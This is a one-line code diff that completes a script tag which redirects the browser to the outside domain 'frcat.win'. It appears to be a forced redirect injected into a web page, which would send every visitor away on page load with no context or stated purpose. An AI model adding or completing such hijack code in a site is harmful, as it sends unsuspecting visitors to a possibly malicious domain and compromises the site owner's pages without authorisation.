@@ -1,1 +1,1 @@
-<script>window.location.href="https://frcat.win"
+<script>window.location.href="https://frcat.win"</script>
